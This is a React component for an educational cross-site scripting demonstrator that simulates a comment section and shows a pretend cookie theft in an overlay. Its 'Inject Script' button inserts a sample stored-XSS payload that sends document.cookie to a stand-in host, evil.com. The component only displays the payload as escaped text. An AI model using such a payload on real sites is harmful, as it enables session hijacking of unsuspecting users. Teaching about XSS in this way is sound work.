'use client';

import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { MessageSquare, Send, Code, AlertTriangle, Cookie } from 'lucide-react';

interface Comment {
  id: number;
  author: string;
  content: string;
  isMalicious: boolean;
}

export default function XSSVisualizer() {
  const [comments, setComments] = useState<Comment[]>([
    { id: 1, author: 'Alice', content: 'Great article!', isMalicious: false },
    { id: 2, author: 'Bob', content: 'Thanks for sharing.', isMalicious: false },
  ]);
  const [input, setInput] = useState('');
  const [showCookieAlert, setShowCookieAlert] = useState(false);

  const handlePost = () => {
    if (!input.trim()) return;

    const isMalicious = input.includes('<script>');
    const newComment = {
      id: Date.now(),
      author: 'Guest',
      content: input,
      isMalicious
    };

    setComments([...comments, newComment]);
    setInput('');

    if (isMalicious) {
      setTimeout(() => {
        setShowCookieAlert(true);
        setTimeout(() => setShowCookieAlert(false), 3000);
      }, 500);
    }
  };

  const injectXSS = () => {
    setInput("<script>fetch('http://evil.com?cookie='+document.cookie)</script>");
  };

  return (
    <div className="bg-slate-900 rounded-xl p-6 border border-slate-800 shadow-xl overflow-hidden relative min-h-[400px] flex flex-col">
      
      {/* Simulation Overlay for Alert */}
      <AnimatePresence>
        {showCookieAlert && (
            <motion.div 
                initial={{ scale: 0.8, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.8, opacity: 0 }}
                className="absolute inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm"
            >
                <div className="bg-white text-slate-900 p-6 rounded-lg shadow-2xl max-w-sm w-full mx-4 border-l-8 border-red-500">
                    <h3 className="text-xl font-bold mb-2 flex items-center gap-2">
                        <AlertTriangle className="text-red-600" />
                        XSS Executed!
                    </h3>
                    <p className="mb-4 text-sm">The malicious script injected into the comment was executed by the browser.</p>
                    <div className="bg-slate-100 p-3 rounded font-mono text-xs text-slate-600 flex items-center gap-2">
                        <Cookie className="w-4 h-4 text-orange-500" />
                        <span>session_id=abc123secret</span>
                    </div>
                    <div className="mt-2 text-xs text-red-500 font-bold text-right">Sent to evil.com</div>
                </div>
            </motion.div>
        )}
      </AnimatePresence>

      <div className="flex justify-between items-center mb-6">
        <h3 className="font-bold text-white flex items-center gap-2">
            <MessageSquare className="w-5 h-5 text-green-400" />
            Comments Section
        </h3>
        <button 
            onClick={injectXSS}
            className="text-xs bg-red-500/20 text-red-400 px-3 py-1.5 rounded hover:bg-red-500/30 transition-colors flex items-center gap-1"
        >
            <Code className="w-3 h-3" />
            Inject Script
        </button>
      </div>

      {/* Comments Feed */}
      <div className="flex-1 bg-slate-950 rounded-lg p-4 mb-4 overflow-y-auto space-y-3 max-h-[250px] border border-slate-800">
        {comments.map((comment) => (
            <div key={comment.id} className="bg-slate-900 p-3 rounded border border-slate-800">
                <div className="flex items-center gap-2 mb-1">
                    <div className="w-6 h-6 rounded-full bg-slate-700 flex items-center justify-center text-xs font-bold text-slate-300">
                        {comment.author[0]}
                    </div>
                    <span className="text-xs font-bold text-slate-400">{comment.author}</span>
                </div>
                <div className={`text-sm ${comment.isMalicious ? 'text-red-400 font-mono text-xs' : 'text-slate-300'}`}>
                    {comment.content}
                </div>
            </div>
        ))}
        {comments.length === 0 && (
            <p className="text-slate-600 text-center italic text-sm py-4">No comments yet.</p>
        )}
      </div>

      {/* Input Area */}
      <div className="flex gap-2">
        <input 
            type="text" 
            value={input}
            onChange={(e) => setInput(e.target.value)}
            placeholder="Write a comment..."
            className="flex-1 bg-slate-950 border border-slate-700 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-green-500 transition-colors text-sm font-mono"
            onKeyDown={(e) => e.key === 'Enter' && handlePost()}
        />
        <button 
            onClick={handlePost}
            className="bg-green-600 hover:bg-green-500 text-white p-2 rounded-lg transition-colors"
        >
            <Send className="w-5 h-5" />
        </button>
      </div>
    </div>
  );
}

